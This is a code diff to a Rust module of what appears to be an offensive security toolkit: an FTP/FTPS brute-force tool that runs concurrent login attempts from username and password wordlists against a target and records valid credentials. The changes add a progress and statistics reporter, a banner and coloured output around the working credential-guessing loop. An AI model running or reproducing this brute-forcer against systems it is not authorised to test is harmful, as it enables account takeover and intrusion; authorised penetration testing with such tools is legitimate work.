@@ -7,11 +7,93 @@ use std::{
     io::{BufRead, BufReader, Write},
     path::PathBuf,
     sync::Arc,
+    time::Instant,
 };
 use std::path::Path;
-use std::sync::atomic::{AtomicBool, Ordering};
+use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
 use tokio::{sync::{Mutex, Semaphore}, time::{sleep, Duration}};
 use futures::stream::{FuturesUnordered, StreamExt};
+
+const PROGRESS_INTERVAL_SECS: u64 = 2;
+
+// Statistics tracking for progress reporting
+struct Statistics {
+    total_attempts: AtomicU64,
+    successful_attempts: AtomicU64,
+    failed_attempts: AtomicU64,
+    error_attempts: AtomicU64,
+    start_time: Instant,
+}
+
+impl Statistics {
+    fn new() -> Self {
+        Self {
+            total_attempts: AtomicU64::new(0),
+            successful_attempts: AtomicU64::new(0),
+            failed_attempts: AtomicU64::new(0),
+            error_attempts: AtomicU64::new(0),
+            start_time: Instant::now(),
+        }
+    }
+
+    fn record_attempt(&self, success: bool, error: bool) {
+        self.total_attempts.fetch_add(1, Ordering::Relaxed);
+        if error {
+            self.error_attempts.fetch_add(1, Ordering::Relaxed);
+        } else if success {
+            self.successful_attempts.fetch_add(1, Ordering::Relaxed);
+        } else {
+            self.failed_attempts.fetch_add(1, Ordering::Relaxed);
+        }
+    }
+
+    fn print_progress(&self) {
+        let total = self.total_attempts.load(Ordering::Relaxed);
+        let success = self.successful_attempts.load(Ordering::Relaxed);
+        let failed = self.failed_attempts.load(Ordering::Relaxed);
+        let errors = self.error_attempts.load(Ordering::Relaxed);
+        let elapsed = self.start_time.elapsed().as_secs_f64();
+        let rate = if elapsed > 0.0 { total as f64 / elapsed } else { 0.0 };
+
+        print!(
+            "\r{} {} attempts | {} OK | {} fail | {} err | {:.1}/s    ",
+            "[Progress]".cyan(),
+            total.to_string().bold(),
+            success.to_string().green(),
+            failed,
+            errors.to_string().red(),
+            rate
+        );
+        let _ = std::io::stdout().flush();
+    }
+
+    fn print_final(&self) {
+        println!();
+        let total = self.total_attempts.load(Ordering::Relaxed);
+        let success = self.successful_attempts.load(Ordering::Relaxed);
+        let failed = self.failed_attempts.load(Ordering::Relaxed);
+        let errors = self.error_attempts.load(Ordering::Relaxed);
+        let elapsed = self.start_time.elapsed().as_secs_f64();
+
+        println!("{}", "=== Statistics ===".bold());
+        println!("  Total attempts:    {}", total);
+        println!("  Successful:        {}", success.to_string().green().bold());
+        println!("  Failed:            {}", failed);
+        println!("  Errors:            {}", errors.to_string().red());
+        println!("  Elapsed time:      {:.2}s", elapsed);
+        if elapsed > 0.0 {
+            println!("  Average rate:      {:.1} attempts/s", total as f64 / elapsed);
+        }
+    }
+}
+
+fn display_banner() {
+    println!("{}", "╔═══════════════════════════════════════════════════════════╗".cyan());
+    println!("{}", "║   FTP Brute Force Module                                  ║".cyan());
+    println!("{}", "║   Supports FTP and FTPS (TLS) with IPv4/IPv6              ║".cyan());
+    println!("{}", "╚═══════════════════════════════════════════════════════════╝".cyan());
+    println!();
+}
 
 /// Format IPv4 or IPv6 addresses with port
 fn format_addr(target: &str, port: u16) -> String {
@@ -34,8 +116,8 @@ fn format_addr(target: &str, port: u16) -> String {
 }
 
 pub async fn run(target: &str) -> Result<()> {
-    println!("=== FTP Brute Force Module ===");
-    println!("[*] Target: {}", target);
+    display_banner();
+    println!("{}", format!("[*] Target: {}", target).cyan());
 
     let port: u16 = loop {
         let input = prompt_default("FTP Port", "21")?;
@@ -68,6 +150,7 @@ pub async fn run(target: &str) -> Result<()> {
     let addr = format_addr(target, port);
     let found = Arc::new(Mutex::new(Vec::new()));
     let stop = Arc::new(AtomicBool::new(false));
+    let stats = Arc::new(Statistics::new());
 
     println!("\n[*] Starting brute-force on {}", addr);
 
@@ -76,12 +159,31 @@ pub async fn run(target: &str) -> Result<()> {
         println!("[!] Username wordlist is empty or invalid. Exiting.");
         return Ok(());
     }
+    println!("{}", format!("[*] Loaded {} usernames", users.len()).cyan());
 
     let passes = load_lines(&passwords_file)?;
     if passes.is_empty() {
         println!("[!] Password wordlist is empty or invalid. Exiting.");
         return Ok(());
     }
+    println!("{}", format!("[*] Loaded {} passwords", passes.len()).cyan());
+
+    let total_attempts = if combo_mode { users.len() * passes.len() } else { passes.len() };
+    println!("{}", format!("[*] Total attempts: {}", total_attempts).cyan());
+    println!();
+
+    // Start progress reporter
+    let stats_clone = stats.clone();
+    let stop_clone = stop.clone();
+    let progress_handle = tokio::spawn(async move {
+        loop {
+            if stop_clone.load(Ordering::Relaxed) {
+                break;
+            }
+            stats_clone.print_progress();
+            sleep(Duration::from_secs(PROGRESS_INTERVAL_SECS)).await;
+        }
+    });
 
     let mut tasks = FuturesUnordered::new();
 
@@ -97,6 +199,7 @@ pub async fn run(target: &str) -> Result<()> {
                 let found_clone = Arc::clone(&found);
                 let stop_clone = Arc::clone(&stop);
                 let semaphore_clone = Arc::clone(&semaphore);
+                let stats_clone = Arc::clone(&stats);
                 let verbose_flag = verbose;
                 let stop_on_success_flag = stop_on_success;
 
@@ -113,17 +216,24 @@ pub async fn run(target: &str) -> Result<()> {
                     }
                     match try_ftp_login(&addr_clone, &user_clone, &pass_clone, verbose_flag).await {
                         Ok(true) => {
-                            println!("[+] {} -> {}:{}", addr_clone, user_clone, pass_clone);
+                            println!("\r{}", format!("[+] {} -> {}:{}", addr_clone, user_clone, pass_clone).green().bold());
                             found_clone.lock().await.push((addr_clone.clone(), user_clone.clone(), pass_clone.clone()));
+                            stats_clone.record_attempt(true, false);
                             if stop_on_success_flag {
                                 stop_clone.store(true, Ordering::Relaxed);
                             }
                         }
                         Ok(false) => {
-                            log(verbose_flag, &format!("[-] {} -> {}:{}", addr_clone, user_clone, pass_clone));
+                            stats_clone.record_attempt(false, false);
+                            if verbose_flag {
+                                println!("\r{}", format!("[-] {} -> {}:{}", addr_clone, user_clone, pass_clone).dimmed());
+                            }
                         }
                         Err(e) => {
-                            log(verbose_flag, &format!("[!] {}: error: {}", addr_clone, e));
+                            stats_clone.record_attempt(false, true);
+                            if verbose_flag {
+                                println!("\r{}", format!("[!] {}: error: {}", addr_clone, e).red());
+                            }
                         }
                     }
                     drop(permit);
@@ -141,6 +251,7 @@ pub async fn run(target: &str) -> Result<()> {
                 let found_clone = Arc::clone(&found);
                 let stop_clone = Arc::clone(&stop);
                 let semaphore_clone = Arc::clone(&semaphore);
+                let stats_clone = Arc::clone(&stats);
                 let verbose_flag = verbose;
                 let stop_on_success_flag = stop_on_success;
 
@@ -157,17 +268,24 @@ pub async fn run(target: &str) -> Result<()> {
                     }
                     match try_ftp_login(&addr_clone, &user, &pass_clone, verbose_flag).await {
                         Ok(true) => {
-                            println!("[+] {} -> {}:{}", addr_clone, user, pass_clone);
+                            println!("\r{}", format!("[+] {} -> {}:{}", addr_clone, user, pass_clone).green().bold());
                             found_clone.lock().await.push((addr_clone.clone(), user.clone(), pass_clone.clone()));
+                            stats_clone.record_attempt(true, false);
                             if stop_on_success_flag {
                                 stop_clone.store(true, Ordering::Relaxed);
                             }
                         }
                         Ok(false) => {
-                            log(verbose_flag, &format!("[-] {} -> {}:{}", addr_clone, user, pass_clone));
+                            stats_clone.record_attempt(false, false);
+                            if verbose_flag {
+                                println!("\r{}", format!("[-] {} -> {}:{}", addr_clone, user, pass_clone).dimmed());
+                            }
                         }
                         Err(e) => {
-                            log(verbose_flag, &format!("[!] {}: error: {}", addr_clone, e));
+                            stats_clone.record_attempt(false, true);
+                            if verbose_flag {
+                                println!("\r{}", format!("[!] {}: error: {}", addr_clone, e).red());
+                            }
                         }
                     }
                     drop(permit);
@@ -178,17 +296,26 @@ pub async fn run(target: &str) -> Result<()> {
 
     while let Some(res) = tasks.next().await {
         if let Err(e) = res {
-            log(verbose, &format!("[!] Task panicked (likely due to forced shutdown or internal error): {}", e));
+            if verbose {
+                println!("\r{}", format!("[!] Task error: {}", e).red());
+            }
         }
     }
 
+    // Stop progress reporter
+    stop.store(true, Ordering::Relaxed);
+    let _ = progress_handle.await;
+
+    // Print final statistics
+    stats.print_final();
+
     let creds = found.lock().await;
     if creds.is_empty() {
-        println!("\n[-] No credentials found.");
+        println!("{}", "[-] No credentials found.".yellow());
     } else {
-        println!("\n[+] Valid credentials:");
+        println!("{}", format!("[+] Found {} valid credential(s):", creds.len()).green().bold());
         for (host, user, pass) in creds.iter() {
-            println!("     {} -> {}:{}", host, user, pass);
+            println!("  {}  {} -> {}:{}", "✓".green(), host, user, pass);
         }
         if let Some(path) = save_path {
             let file_path = get_filename_in_current_dir(&path);
@@ -365,12 +492,6 @@ fn load_lines<P: AsRef<Path>>(path: P) -> Result<Vec<String>> {
         .filter_map(|line| line.ok().map(|s| s.trim().to_string()))
         .filter(|line| !line.is_empty())
         .collect())
-}
-
-fn log(verbose: bool, msg: &str) {
-    if verbose {
-        println!("{}", msg);
-    }
 }
 
 fn get_filename_in_current_dir(input: &str) -> PathBuf {
